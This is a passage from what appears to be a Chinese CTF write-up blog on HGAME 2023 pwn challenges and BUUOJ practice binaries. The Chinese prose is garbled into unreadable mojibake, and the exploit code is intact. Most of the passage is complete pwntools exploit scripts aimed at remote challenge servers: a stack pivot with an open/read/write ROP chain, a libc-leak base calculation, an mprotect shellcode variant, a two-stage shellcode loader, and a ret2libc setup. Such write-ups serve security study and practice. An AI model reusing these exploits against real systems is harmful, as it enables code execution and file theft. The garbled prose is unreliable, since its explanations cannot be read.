è½½åœ°å€ï¼Œä»è€Œä¸èƒ½é€šè¿‡ROPgadgetç­‰ä¸€äº›å·¥å…·æ¥å¸®åŠ©è§£é¢˜ã€‚è§£æ³•ï¼šå†…å­˜æ˜¯ä»¥é¡µè½½å…¥æœºåˆ¶ï¼Œå¦‚æœå¼€å¯PIEä¿æŠ¤çš„è¯ï¼Œåªèƒ½å½±å“åˆ°å•ä¸ªå†…å­˜é¡µï¼Œä¸€ä¸ªå†…å­˜é¡µå¤§å°ä¸º0x1000ï¼Œé‚£ä¹ˆå°±æ„å‘³ç€ä¸ç®¡åœ°å€æ€ä¹ˆå˜ï¼ŒæŸä¸€æ¡æŒ‡ä»¤çš„åä¸‰ä½åå…­è¿›åˆ¶æ•°çš„åœ°å€æ˜¯å§‹ç»ˆä¸å˜çš„ã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡è¦†ç›–åœ°å€çš„åå‡ ä½æ¥å¯ä»¥æ§åˆ¶ç¨‹åºçš„æµç¨‹ï¼‰ ç»“æœï¼š ORWCTFä¸­è¿™ç±»PWNé¢˜ç›®é€šå¸¸é€šè¿‡ç¦ç”¨execveç³»ç»Ÿè°ƒç”¨æ·»åŠ æ²™ç®±ï¼Œä¸èƒ½ç›´æ¥æ‰§è¡Œå‘½ä»¤getshellï¼Œè¿™æ—¶å€™éœ€è¦é€šè¿‡è°ƒç”¨openã€readã€writeè¿™æ ·çš„å‡½æ•°æ‰“å¼€flagï¼Œå­˜åˆ°å†…å­˜ä¸­ï¼Œå†è¾“å‡º å°†ä¸‰ä¸ªå‡½æ•°å¼€å¤´å­—æ¯ä½œä¸ºç®€ç§°ï¼Œä¹Ÿå°±æ˜¯orw å¯ä»¥é€šè¿‡seccomp-toolsæ¥åˆ¤æ–­æ˜¯å¦æ·»åŠ æ²™ç®±ï¼Œä»¥åŠæŸ¥çœ‹æ²™ç®±çš„è§„åˆ™ 1seccomp-tools dump ./pwn åƒè¿™æ ·å°±æ˜¯æ¯”è¾ƒç»å…¸çš„åªå…è®¸64ä½çš„readã€writeã€openä¸‰ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œå…¶ä»–çš„ç³»ç»Ÿè°ƒç”¨å·éƒ½è¢«ç¦æ­¢ è¿™é‡Œéœ€è¦ç”¨åˆ°æ ˆè¿ç§» æ ˆè¿ç§»çš„æœ¬è´¨å°±æ˜¯æ§åˆ¶rspå’Œrbpï¼Œå°†æ ˆå¸§è½¬ç§»åˆ°æˆ‘ä»¬æƒ³è¦çš„ä½ç½®ï¼Œè¿™é‡Œéœ€è¦æ‰§è¡Œä¸¤æ¬¡leave;returnã€‚ leave&#x3D;mov rsp,rbp;pop rbp æ‰€ä»¥ç¬¬ä¸€æ¬¡ä¸èƒ½å°†rspè¿›è¡Œæ”¹å˜ ç¬¬ä¸€æ¬¡æ˜¯å°†rbpè½¬ç§»ï¼Œç¬¬äºŒæ¬¡æ˜¯å°†rspè½¬ç§»ã€‚ æ ˆè¿ç§»æ¡ä»¶ï¼š å­˜åœ¨ leave ret è¿™ç±»gadgetæŒ‡ä»¤ å­˜åœ¨å¯æ‰§è¡Œshellcodeçš„å†…å­˜åŒºåŸŸ é“¾æ¥ï¼šæ ˆè¿ç§»åŸç†ä»‹ç»ä¸åº”ç”¨ - Max1z - åšå®¢å›­ (cnblogs.com) è¿™é‡Œè¯´æ˜ä¸€ä¸‹ï¼šopenæ‹¿åˆ°çš„åªæ˜¯æ–‡ä»¶å¥æŸ„ï¼Œé‡Œé¢æ²¡æœ‰æ–‡ä»¶å†…å®¹ï¼Œè¦è¯»æ–‡ä»¶å†…å®¹è¿˜æ˜¯è¦æ‰§è¡Œreadï¼Œreadçš„å‚æ•°å°±è¦æ±‚æ–‡ä»¶å¥æŸ„ï¼Œreadçš„åŠŸèƒ½å°±æ˜¯å°†ç¡¬ç›˜æ–‡ä»¶å†…å®¹è¯»åˆ°å†…å­˜ä¸­çš„æŸä¸€å—ç¼“å†²åŒºä¸­ï¼Œç„¶åwriteè´Ÿè´£å°†ç¼“å†²åŒºä¸­çš„å†…å®¹å†™è¿›å±å¹•ä¸­ é¢˜ç›®ä¸­æº¢å‡ºé•¿åº¦ä¸º0x30,é‚£æ³¨å…¥åœ°å€ä¸º0x30&#x2F;0x8&#x3D;6,å°±6æ¡æ˜¾ç„¶ä¸èƒ½æ„æˆropé“¾ è¿›è¡Œæ ˆè¿ç§»ï¼Œç”±äºæˆ‘æ²¡åšè¿‡æ ˆè¿ç§»çš„é¢˜ï¼Œè¿™é‡Œè¯¦ç»†å†™ä¸€ä¸‹ ç¬¬ä¸€æ¬¡æº¢å‡ºï¼ŒæŠŠrbpæ”¾åˆ°åˆ«çš„åœ°æ–¹,ç„¶åæ³„æ¼putsçš„å†…å­˜åœ°å€,rbpæ”¾åˆ°bss+0x200ï¼Œè¿™ä¸ªåœ°å€å…¶å®æ˜¯ç¨‹åºåœ°å€ä¹‹å¤–çš„ç©ºé—´äº†ï¼Œæ‰€ä»¥æ‹¿æ¥å½“ä½œæ–°æ ˆå¯¹ç¨‹åºä¸äº§ç”Ÿå½±å“ 12payload1 = b&#x27;A&#x27; * 0x100 + p64(bss+0x200)payload1 += p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vuln_addr) è®¡ç®—åŸºåœ°å€ï¼Œç®—å‡ºorwä¸‰ä¸ªå‡½æ•°çš„åœ°å€ 12345success(&#x27;puts:&#x27;,hex(puts_addr))base_addr = puts_addr - libc_putsopen_addr = libc.sym[&#x27;open&#x27;] + base_addrread_addr = libc.sym[&#x27;read&#x27;] + base_addrwrite_addr = libc.sym[&#x27;write&#x27;] + base_addr ç¬¬äºŒæ¬¡æº¢å‡ºï¼Œå°†rbpæ”¾ç½®åˆ°æ–°æ ˆ 1234payload = b&quot;a&quot; * 0x100payload += p64(bss + 0x200)payload += p64(vuln_addr + 0x0F)io.send(payload) æ‰§è¡Œå®Œç¬¬äºŒæ¬¡æº¢å‡ºåï¼Œrspåœ¨æ—§æ ˆä½ç½®ï¼Œrbpåœ¨æ–°æ ˆä½ç½®ï¼Œä¸ºäº†è®©rbpåœ¨æ–°æ ˆä½ç½®ä¸å‘ç”Ÿç§»åŠ¨ï¼Œè¿™é‡Œæˆ‘ä»¬ç›´æ¥å°†ä¹‹åçš„å‡½æ•°ç›´æ¥å®šä½åˆ°readå‡½æ•°ä¸Šï¼Œ+0xfï¼Œå› ä¸ºreadå‡½æ•°ä¹‹å‰æœ‰å¯¹rbpå’Œrspè¿›è¡Œæ“ä½œ ç¬¬ä¸‰æ¬¡æº¢å‡ºï¼Œå°†è¿›è¡Œä¸¤æ¬¡leaveï¼›retï¼Œè¿™æ ·rspå°±å°†é”å®šåœ¨æ–°æ ˆçš„æ ˆé¡¶ä½ç½®ï¼Œå› ä¸ºretä¸»è¦æ˜¯é rspæ¥æ§åˆ¶ç¨‹åºæµï¼Œrbpåªæ˜¯æ‹¿æ¥å®šä½å±€éƒ¨å˜é‡ 1234567891011121314151617181920212223242526payload2 = b&#x27;/flag\\x00\\x00\\x00&#x27;payload2 += p64(pop_rdi_ret)payload2 += p64(0x404160) #è¿™é‡Œå°±æ˜¯æ–°rbp-0x100çš„åœ°æ–¹ï¼Œä¹Ÿå°±æ˜¯åˆšå†™&#x27;/flag\\x00\\x00\\x00&#x27;çš„åœ°å€payload2 += p64(pop_rsi_ret)payload2 += p64(0)payload2 += p64(open_addr)payload2 += p64(pop_rdi_ret)payload2 += p64(0x3) payload2 += p64(pop_rsi_ret)payload2 += p64(0x404711) # å¯èƒ½æ˜¯æŒ‡å®šç¼“å†²åŒºåœ°å€payload2 += p64(pop_rdx_ret)payload2 += p64(0x100)payload2 += p64(read_addr)payload2 += p64(pop_rdi_ret)payload2 += p64(0x1)payload2 += p64(pop_rsi_ret)payload2 += p64(0x404711)payload2 += p64(pop_rdx_ret)payload2 += p64(0x100)payload2 += p64(write_addr)payload2 = payload2.ljust(0x100,b&#x27;a&#x27;)payload2 += p64(0x404160) # è¿™é‡Œå°±æ˜¯ç¬¬ä¸€æ¬¡pop rbpårbpçš„ä½ç½®ï¼Œç¬¬äºŒæ¬¡popè¦å¾€æˆ‘ä»¬æƒ³è¦çš„æ ˆé¡¶èµ°ï¼ŒæŠŠrspç§»è¿‡å»payload2 += p64(leave_ret_addr) æ‰€ä»¥ç¬¬ä¸‰æ¬¡çš„rbpæœ€ç»ˆä½ç½®ä¸ç”¨å»ç®¡å®ƒï¼Œrbpçš„ä»»åŠ¡å°±æ˜¯è®©rspé”å®šåˆ°æ–°æ ˆæ ˆé¡¶ä½ç½®å°±è¡Œ è¿™é‡Œreadå’Œwriteéƒ½éœ€è¦ä¸‰ä¸ªå‚æ•°ï¼Œ64ä½ï¼Œå‡½æ•°ä»å·¦åˆ°å³å¯„å­˜å™¨åˆ†åˆ«æ˜¯rdi,rsi,rdx é€šè¿‡pop retæŒ‡ä»¤æ¥æ§åˆ¶rspä»è€Œæ§åˆ¶ç¨‹åºæµ ä»¥ä¸Šå°±æ˜¯æ ˆè¿ç§»çš„è¯¦ç»†å†…å®¹ å®Œæ•´ä»£ç ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273from pwn import *# io = process(&#x27;./vuln&#x27;)io = remote(&#x27;week-1.hgame.lwsec.cn&#x27;,31266)elf = ELF(&#x27;./vuln&#x27;)libc = ELF(&#x27;libc-2.31.so&#x27;)context.log_level = &quot;debug&quot;context.terminal = [&quot;konsole&quot;, &quot;-e&quot;]vuln_addr = elf.sym[&#x27;vuln&#x27;]libc_puts = libc.sym[&#x27;puts&#x27;]puts_got = elf.got[&#x27;puts&#x27;]puts_plt = elf.plt[&#x27;puts&#x27;]leave_ret_addr = 0x4012bepop_rdi_ret = 0x0401393bss = 0x404060# ç¬¬ä¸€æ¬¡æº¢å‡ºï¼ŒæŠŠrbpæ”¾åˆ°åˆ«çš„åœ°æ–¹,ç„¶åæ³„æ¼putsçš„å†…å­˜åœ°å€payload1 = b&#x27;A&#x27; * 0x100 + p64(bss+0x200)payload1 += p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vuln_addr)io.sendafter(&#x27;task.\\n&#x27;,payload1)puts_addr = u64(io.recvline().split(b&#x27;\\n&#x27;)[0].ljust(8,b&#x27;\\0&#x27;))success(&#x27;puts:&#x27;,hex(puts_addr))base_addr = puts_addr - libc_putsopen_addr = libc.sym[&#x27;open&#x27;] + base_addrread_addr = libc.sym[&#x27;read&#x27;] + base_addrwrite_addr = libc.sym[&#x27;write&#x27;] + base_addrpop_rsi_ret = 0x02601f + base_addrpop_rdx_ret = 0x142c92 + base_addrpayload = b&quot;a&quot; * 0x100payload += p64(bss + 0x200)payload += p64(vuln_addr + 0x0F)io.send(payload)# ç¬¬äºŒæ¬¡æº¢å‡ºï¼Œå°†rbpæ”¾åˆ°äºŒæ¬¡å†™å…¥çš„å¼€å§‹å¤„ï¼Œå°†rspæ”¾åˆ°ä¸rbpç›¸åŒä½ç½®payload2 = b&#x27;/flag\\x00\\x00\\x00&#x27;payload2 += p64(pop_rdi_ret)payload2 += p64(0x404160) #è¿™é‡Œå°±æ˜¯æ–°rbp-0x100çš„åœ°æ–¹ï¼Œä¹Ÿå°±æ˜¯åˆšå†™&#x27;/flag\\x00\\x00\\x00&#x27;çš„åœ°å€payload2 += p64(pop_rsi_ret)payload2 += p64(0)payload2 += p64(open_addr)payload2 += p64(pop_rdi_ret)payload2 += p64(0x3) payload2 += p64(pop_rsi_ret)payload2 += p64(0x404711) # æŒ‡å®šç¼“å†²åŒºåœ°å€,éšæ„payload2 += p64(pop_rdx_ret)payload2 += p64(0x100)payload2 += p64(read_addr)payload2 += p64(pop_rdi_ret)payload2 += p64(0x1)payload2 += p64(pop_rsi_ret)payload2 += p64(0x404711)payload2 += p64(pop_rdx_ret)payload2 += p64(0x100)payload2 += p64(write_addr)payload2 = payload2.ljust(0x100,b&#x27;a&#x27;)payload2 += p64(0x404160) # è¿™é‡Œå°±æ˜¯ç¬¬ä¸€æ¬¡pop rbpårbpçš„ä½ç½®ï¼Œç¬¬äºŒæ¬¡popè¦å¾€æˆ‘ä»¬æƒ³è¦çš„æ ˆé¡¶èµ°ï¼ŒæŠŠrspç§»è¿‡å»payload2 += p64(leave_ret_addr)# gdb.attach(io)io.send(payload2)io.interactive() æœ€åç»“æœï¼š è¿™é‡Œè¿˜æœ‰ä¸€ç§åšæ³•ï¼ŒåŸæœ¬ç¨‹åºå¼€å¯äº†NXä¿æŠ¤ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡libcä¸­çš„mprotectå‡½æ•°ç»™ä¸€æ®µå†…å­˜åŒºåŸŸæ›´æ”¹æƒé™ï¼Œç„¶ååœ¨æ ˆä¸­å†™å…¥shellcodeï¼Œç„¶åè®©ç¨‹åºæ‰§è¡Œæ ˆä¸­çš„shellcodeï¼Œè¿™é‡Œshellcodeä¹Ÿå¾ˆé•¿ï¼Œä¹Ÿéœ€è¦ç”¨åˆ°æ ˆè¿ç§» 12345678910111213141516payload2 = p64(0) #0x404160payload2 += p64(pop_rdi_ret)payload2 += p64(0x404000) #è¿™é‡Œæ˜¯mprotectå‡½æ•°è¦æ“ä½œçš„å¼€å§‹åœ°å€ #0x404170payload2 += p64(pop_rsi_ret)payload2 += p64(0x1000) # è¦æ“ä½œçš„å¤§å° #0x404180payload2 += p64(pop_rdx_ret)payload2 += p64(7) # 7ä»£è¡¨å¯è¯»å¯å†™å¯æ‰§è¡Œæƒé™ #0x404190payload2 += p64(mprotect_addr)payload2 += p64(0x4041a8) #0x4041a0payload2 += asm(shellcraft.open(&quot;/flag&quot;,1)) payload2 += asm(shellcraft.read(3,0x404500,100))payload2 += asm(shellcraft.write(1,0x404500,100))payload2 = payload2.ljust(0x100,b&#x27;a&#x27;)payload2 += p64(0x404160) # è¿™é‡Œå°±æ˜¯ç¬¬ä¸€æ¬¡pop rbpårbpçš„ä½ç½®ï¼Œç¬¬äºŒæ¬¡popè¦å¾€æˆ‘ä»¬æƒ³è¦çš„æ ˆé¡¶èµ°ï¼ŒæŠŠrspç§»è¿‡å»payload2 += p64(leave_ret_addr) mprotectå‚æ•°æœ‰ä¸‰ï¼Œèµ·å§‹åœ°å€ï¼Œé•¿åº¦ï¼Œæƒé™ è¿™é‡Œç¨‹åºå‡ºäº†bugï¼Œflagä¸­gå®åœ¨å†™ä¸è¿›å»ä¸çŸ¥é“ä¸ºå•¥(æ›´æ–°ï¼Œæ²¡è®¾ç½®64ä½ï¼ŒåŠ ä¸Šcontext.arch &#x3D; â€œamd64â€è¿™å¥å°±è¡Œï¼Œå› ä¸ºç³»ç»Ÿé»˜è®¤32ä½ï¼Œ&#x2F;flagçš„å­—ç¬¦ä¸²æ­£å¥½è¶…å‡º4å­—èŠ‚æ•°æ®) å®Œæ•´ä»£ç ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859from pwn import *# io = process(&#x27;./vuln&#x27;)io = remote(&#x27;week-1.hgame.lwsec.cn&#x27;,31266)elf = ELF(&#x27;./vuln&#x27;)libc = ELF(&#x27;libc-2.31.so&#x27;)# context.log_level = &quot;debug&quot;# context.terminal = [&quot;konsole&quot;, &quot;-e&quot;]context.arch = &quot;amd64&quot;vuln_addr = elf.sym[&#x27;vuln&#x27;]libc_puts = libc.sym[&#x27;puts&#x27;]puts_got = elf.got[&#x27;puts&#x27;]puts_plt = elf.plt[&#x27;puts&#x27;]leave_ret_addr = 0x4012bepop_rdi_ret = 0x0401393bss = 0x404060# ç¬¬ä¸€æ¬¡æº¢å‡ºï¼ŒæŠŠrbpæ”¾åˆ°åˆ«çš„åœ°æ–¹,ç„¶åæ³„æ¼putsçš„å†…å­˜åœ°å€payload1 = b&#x27;A&#x27; * 0x100 + p64(bss+0x200)payload1 += p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vuln_addr)io.sendafter(&#x27;task.\\n&#x27;,payload1)puts_addr = u64(io.recv(6).ljust(8,b&#x27;\\0&#x27;))success(&#x27;puts:&#x27;,hex(puts_addr))base_addr = puts_addr - libc_putsmprotect_addr = libc.sym[&#x27;mprotect&#x27;] + base_addrpop_rsi_ret = 0x02601f + base_addrpop_rdx_ret = 0x142c92 + base_addrpayload = b&quot;a&quot; * 0x100payload += p64(bss + 0x200)payload += p64(vuln_addr + 0x0F)io.send(payload)# ç¬¬äºŒæ¬¡æº¢å‡ºï¼Œå°†rbpæ”¾åˆ°äºŒæ¬¡å†™å…¥çš„å¼€å§‹å¤„ï¼Œå°†rspæ”¾åˆ°ä¸rbpç›¸åŒä½ç½®payload2 = p64(0) #0x404160payload2 += p64(pop_rdi_ret)payload2 += p64(0x404000) #è¿™é‡Œæ˜¯mprotectå‡½æ•°è¦æ“ä½œçš„å¼€å§‹åœ°å€ #0x404170payload2 += p64(pop_rsi_ret)payload2 += p64(0x1000) # è¦æ“ä½œçš„å¤§å° #0x404180payload2 += p64(pop_rdx_ret)payload2 += p64(7) # 7ä»£è¡¨å¯è¯»å¯å†™å¯æ‰§è¡Œæƒé™ #0x404190payload2 += p64(mprotect_addr)payload2 += p64(0x4041a8) #0x4041a0payload2 += asm(shellcraft.open(&quot;/flag&quot;,1)) payload2 += asm(shellcraft.read(3,0x404500,100))payload2 += asm(shellcraft.write(1,0x404500,100))payload2 = payload2.ljust(0x100,b&#x27;a&#x27;)payload2 += p64(0x404160) # è¿™é‡Œå°±æ˜¯ç¬¬ä¸€æ¬¡pop rbpårbpçš„ä½ç½®ï¼Œç¬¬äºŒæ¬¡popè¦å¾€æˆ‘ä»¬æƒ³è¦çš„æ ˆé¡¶èµ°ï¼ŒæŠŠrspç§»è¿‡å»payload2 += p64(leave_ret_addr)# gdb.attach(io)io.send(payload2)io.interactive() simple_shellcodeé¢˜ç›®ï¼š 12345678910int __cdecl main(int argc, const char **argv, const char **envp)&#123; init(argc, argv, envp); mmap((void *)0xCAFE0000LL, 0x1000uLL, 7, 33, -1, 0LL); puts(&quot;Please input your shellcode:&quot;); read(0, (void *)0xCAFE0000LL, 0x10uLL); sandbox(); MEMORY[0xCAFE0000](); return 0;&#125; é¢˜ç›®ç”¨mmapæ˜ å°„å‡ºä¸€æ®µä»¥0xCAFE0000å¼€å§‹ï¼Œé•¿åº¦ä¸º0x1000ï¼Œæƒé™æ˜¯7ï¼ˆå¯è¯»å¯å†™å¯æ‰§è¡Œï¼‰ ç”¨sandboxè®¾ç½®äº†ç³»ç»Ÿæƒé™ è¿™é‡Œå‘0xCAFE0000è¯»å…¥16å­—èŠ‚ï¼Œå¯ä»¥è€ƒè™‘ropï¼Œä½†æ£€æŸ¥ä¿æŠ¤æ—¶ï¼Œå°±æ”¾å¼ƒäº† å†™å…¥shellcode,ç”¨orwçš„è¯ï¼Œé•¿åº¦ä¹Ÿè¿œè¿œä¸å¤Ÿ HINTS: ä¸€æ¬¡readä¸å¤Ÿå¤šï¼Œä¸ºä»€ä¹ˆä¸å†è¯»ä¸€æ¬¡å‘¢ï¼Ÿ ç¬¬ä¸€æ¬¡å°†readçš„shellcodeè¯»å…¥ï¼Œç„¶åå†ç¨‹åºæ‰§è¡Œ0xCAFE0000è¿™æ®µå†…å­˜ï¼Œä»è€Œæ‰§è¡Œè¯»å…¥çš„readï¼Œé‚£å°±è¦å¥½å¥½è®¾è®¡ä¸€æ³¢readçš„shellcodeäº†ï¼Œèµ·åˆæˆ‘æ˜¯ç”¨rdiè¿™ç§64ä½çš„å¯„å­˜å™¨å†™çš„ï¼Œä½†æ˜¯æœ€ç»ˆé•¿åº¦è¿œè¿œè¶…è¿‡16å­—èŠ‚ 1234567shellcode = asm(&quot;&quot;&quot;mov rax,0mov rsi,0xCAFE0010mov rdi,0mov rdx,0x1000syscall&quot;&quot;&quot;) ç„¶ååªèƒ½å…¨éƒ¨æ”¹æˆediè¿™ç§32ä½å¯„å­˜å™¨çš„å½¢å¼äº† 1234567shellcode = asm(&quot;&quot;&quot;mov eax,0mov esi,0xCAFE0010mov edi,0mov edx,0x1000syscall&quot;&quot;&quot;) ä½†æ˜¯è¿˜æ˜¯ä¸è¡Œ æŠŠmov 0çš„æ“ä½œå…¨éƒ¨æ¢æˆxorï¼Œå°±å¯¹äº† 1234567shellcode = asm(&quot;&quot;&quot;xor eax,eaxmov esi,0xCAFE0010xor edi,edimov edx,0x1000syscall&quot;&quot;&quot;) è¿™é‡Œè¦è°ƒç”¨readï¼Œå°±è¦æ¶‰åŠç³»ç»Ÿè°ƒç”¨å·ï¼š åœ¨æ±‡ç¼–ç¨‹åºä¸­ä½¿ç”¨Linuxç³»ç»Ÿè°ƒç”¨ã€‚ æ‚¨éœ€è¦é‡‡å–ä»¥ä¸‹æ­¥éª¤åœ¨ç¨‹åºä¸­ä½¿ç”¨Linuxç³»ç»Ÿè°ƒç”¨ å°†ç³»ç»Ÿè°ƒç”¨å·æ”¾åœ¨EAXå¯„å­˜å™¨ä¸­ã€‚ ç»“æœé€šå¸¸åœ¨EAXå¯„å­˜å™¨ä¸­è¿”å› &#x3D;&#x3D;è¿™é‡Œæ³¨æ„64ä½å’Œ32çš„ç³»ç»Ÿè°ƒç”¨å·æ˜¯ä¸ä¸€æ ·çš„&#x3D;&#x3D; 32ä½ï¼š ä¼ å‚æ–¹å¼ï¼šé¦–å…ˆå°†ç³»ç»Ÿè°ƒç”¨å· ä¼ å…¥ eaxï¼Œsysread çš„è°ƒç”¨å· ä¸º 3 syswrite çš„è°ƒç”¨å· ä¸º 4 64ä½ï¼š ä¼ å‚æ–¹å¼ï¼šé¦–å…ˆå°†ç³»ç»Ÿè°ƒç”¨å· ä¼ å…¥ raxï¼Œsysread çš„è°ƒç”¨å· ä¸º 0 syswrite çš„è°ƒç”¨å· ä¸º 1 æ‰€ä»¥è¿™é‡Œçš„readç³»ç»Ÿè°ƒç”¨å·æ˜¯0 è¿™é‡Œå†™å…¥readçš„shellcodeåï¼Œæ‰§è¡Œæˆ‘ä»¬å†™çš„shellcodeï¼Œç¬¬äºŒæ¬¡å†™å…¥çš„orwä¹Ÿæ˜¯shellcodeï¼Œè¿™é‡Œè¦è®¾ç½®amd64ä½ä¸ç„¶å°±æ— äº†ã€‚ è¿™é‡Œæœ‰ä¸ªç»†èŠ‚åœ¨æ‰§è¡ŒsyscallæŒ‡ä»¤æ—¶ï¼Œç¨‹åºä¼šæŒ‰ç…§æ™®é€šç¨‹åºä¸€æ ·ï¼Œä¼šå°†shellcodeçš„ä¸‹ä¸€æ¡æŒ‡ä»¤å‹æ ˆï¼Œæ‰€ä»¥åœ¨æ‰§è¡Œå®Œsyscallåï¼Œä¸‹ä¸€ä¸ªæŒ‡ä»¤è¦æ‰§è¡Œçš„åœ°æ–¹å°±æ˜¯syscallåçš„åœ°å€ï¼Œè¿™é‡Œé™¤syscallè¿™ä¸€æ¡æŒ‡ä»¤ï¼Œé•¿åº¦ä¸º14ï¼Œæ‰€ä»¥ç¬¬äºŒæ¬¡å†™å…¥çš„åœ°å€ï¼Œåªèƒ½æ˜¯0xCAFE0000+14ä¹‹åçš„åœ°å€ï¼Œè¿™é‡Œæˆ‘ä»¬é€‰æ‹©ä¸º0xCAFE0010å°±å¤Ÿäº†ï¼Œç„¶åç›´æ¥å†™å…¥orwçš„shellcodeã€‚ 123payload = asm(shellcraft.open(&#x27;/flag&#x27;))payload += asm(shellcraft.read(3,0xcafe0500,0x100))payload += asm(shellcraft.write(1,0xcafe0500,0x100)) è¿™é‡Œçš„ç¼“å†²åŒºæˆ‘åŸå…ˆæ˜¯å†™0xcafe1000çš„ï¼Œç»“æœåé¢æ‰å‘ç°å®ƒæ€»å…±æ‰ç”³è¯·äº†0x1000çš„å¤§å°å†…å­˜ï¼Œå“ˆå“ˆ å®Œæ•´ä»£ç : 1234567891011121314151617181920212223from pwn import *io = remote(&#x27;week-1.hgame.lwsec.cn&#x27;,30105)# context.log_level = &quot;debug&quot;context.arch = &quot;amd64&quot;shellcode = asm(&quot;&quot;&quot;xor eax,eaxmov esi,0xCAFE0010xor edi,edimov edx,0x1000syscall&quot;&quot;&quot;)print(&#x27;len:&#x27;,len(shellcode))io.sendafter(&#x27;shellcode:\\n&#x27;,shellcode)# payload = b&#x27;\\x90&#x27; * 0x10payload = asm(shellcraft.open(&#x27;/flag&#x27;))payload += asm(shellcraft.read(3,0xcafe0500,0x100))payload += asm(shellcraft.write(1,0xcafe0500,0x100))io.send(payload)io.interactive() ç»“æœï¼š Week2rebefore_mainé¢˜ä¸­ __attribute__å±æ€§ä¿®é¥°å‡½æ•°ï¼Œå‚è€ƒé“¾æ¥ï¼š(61æ¡æ¶ˆæ¯) æµ…æé€†å‘ä¸­ gcc åœ¨ä¸»å‡½æ•°å‰åè¿è¡Œçš„å‡½æ•°_æ²ä¸€ Â· æ—çš„åšå®¢-CSDNåšå®¢_é€†å‘ init è¯¥é¢˜è€ƒæŸ¥base64ï¼Œæ¢è¡¨å‡½æ•°å®šä¹‰äº†__ attribute__ ((constructor))ä¼šä½¿å‡½æ•°åœ¨ main() å‡½æ•°ä¹‹å‰è¢«æ‰§è¡Œ è¿™é‡Œptraceæ£€æµ‹åè°ƒè¯•ï¼Œå³å‡ºç°åè°ƒè¯•å°±ä¸è¿›è¡Œæ¢è¡¨æ“ä½œ è‡ªå·±æ‰‹åŠ¨æ¢è¡¨åç”¨cyberchefè§£base64å³å¯ Week3re","categories":[{"name":"ctf","slug":"ctf","permalink":"https://pa1r0t.github.io/categories/ctf/"}],"tags":[]},{"title":"pwn_practice1","slug":"pwn-practice1","date":"2023-01-13T03:50:36.000Z","updated":"2023-01-13T12:33:23.186Z","comments":true,"path":"2023/01/13/pwn-practice1/","link":"","permalink":"https://pa1r0t.github.io/2023/01/13/pwn-practice1/","excerpt":"pwn","text":"pwn hgame2018_flag_serverå¼€å¯docker1docker run -v &quot;$(pwd):/ctf/work&quot; -i -t skysider/pwndocker /bin/bash ç¨‹åºæ ¸å¿ƒé€»è¾‘è¿™é‡Œæœ‰ä¸ªéšæœºå€¼ï¼Œè¾“å…¥çš„å€¼å’Œéšæœºå€¼æ¯”è¾ƒ æˆ‘å‡†å¤‡ç”¨é€†å‘çš„å®ˆæ³•ï¼Œæ¥æå®ƒï¼Œå†™äº†ä¸ªcppï¼Œç»“æœè¿è¡Œå¤šæ¬¡ç»“æœéƒ½ä¸ä¸€æ · 123456789101112#include&lt;time.h&gt;#include&lt;stdio.h&gt;#include&lt;random&gt;int main(void)&#123; unsigned int v3 = time(0); printf(&quot;%d\\n&quot;,v3); srand(v3); int v8 = rand(); printf(&quot;%u&quot;,v8); return 1;&#125; giao~~~~~ ç„¶åæˆ‘åªèƒ½è€è€å®å®æ‰¾æ¼æ´äº† å…ˆæ˜¯å‘ç°å¯ä»¥è¯»å–å­—ç¬¦ä¸²name æ‰¾åˆ°è¯»å–å­—ç¬¦ä¸²çš„å‡½æ•°æ˜¯è‡ªå·±ç¼–çš„ æœ€åv10è¿›è¡Œæ£€éªŒ è¿™é‡Œçœ‹æ ˆåˆ†å¸ƒ ç›´æ¥åœ¨s1çš„ä¸‹é¢ï¼Œç›´æ¥å¡«å……â€™Aâ€™*((0x50-0x10)+size(int)) exp123456789from pwn import *io = remote(&#x27;node4.buuoj.cn&#x27;,28388)# io = process(&#x27;./flag_server&#x27;)io.sendlineafter(&#x27;your username length: &#x27;,b&#x27;-1&#x27;)io.sendline(b&#x27;A&#x27;*0x44)io.interactive()io.close() ç»“æœ ciscn_2019_c_1æ ¸å¿ƒç¨‹åº åˆ©ç”¨ç‚¹ï¼šåˆ©ç”¨getsï¼Œå»è¦†ç›–æ ˆä¸­çš„å†…å®¹ï¼Œåˆ©ç”¨ropé“¾æ³„æ¼putså‡½æ•°åœ¨å†…å­˜ä¸­çš„åœ°å€ï¼Œç„¶åé€šè¿‡è¿™ä¸ªåœ°å€å»æ‰¾å¯¹åº”ç‰ˆæœ¬çš„libcï¼Œæ‰¾åˆ°å†…å­˜ä¸­systemçš„åœ°å€å’Œbin_shå­—ç¬¦ä¸²çš„åœ°å€ï¼Œå†åˆ©ç”¨ä¸€æ¬¡ropé“¾æ‰§è¡Œsystemå‡½æ•°å³å¯ è¿™é‡Œæœ‰ä¸€ä¸ªæ¨¡å—å«LibcSearcherï¼Œå®ƒå¯ä»¥è®©ä½¿ç”¨è€…ä¸ç”¨æ‹…å¿ƒæœ¬åœ°å’Œè¿œç¨‹çš„libcæ˜¯å¦ç»Ÿä¸€ï¼Œå®ƒå¯ä»¥å¸®ä½ å»å¯»æ‰¾æ­£åœ¨æ‰§è¡Œçš„libcã€‚éå¸¸å¥½ç”¨ å¯»æ‰¾ropç›®çš„ï¼šå¯»æ‰¾pop rdi ret;æŒ‡ä»¤ï¼Œå› ä¸ºè¯¥æ–‡ä»¶æ˜¯64ä½ï¼Œè€Œ64ä½æ–‡ä»¶é‡‡ç”¨å¯„å­˜å™¨å­˜æ”¾å‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°å­˜æ”¾çš„å¯„å­˜å™¨å°±æ˜¯rdi å‘½ä»¤ï¼š 1ROPgadget --binary ./ciscn_2019_c_1 --only &#x27;pop|ret&#x27; ç»“æœï¼š è„šæœ¬ï¼š123456789101112131415161718192021222324252627282930313233343536from pwn import *from LibcSearcher import *# io = process(&#x27;./ciscn_2019_c_1&#x27;)io = remote(&quot;node4.buuoj.cn&quot;,26320)elf = ELF(&#x27;ciscn_2019_c_1&#x27;)#encrypt_addr = elf.sym[&#x27;encrypt&#x27;]puts_got = elf.got[&#x27;puts&#x27;] # ç”¨äºæ‰“å°putsçš„åœ°å€puts_plt = 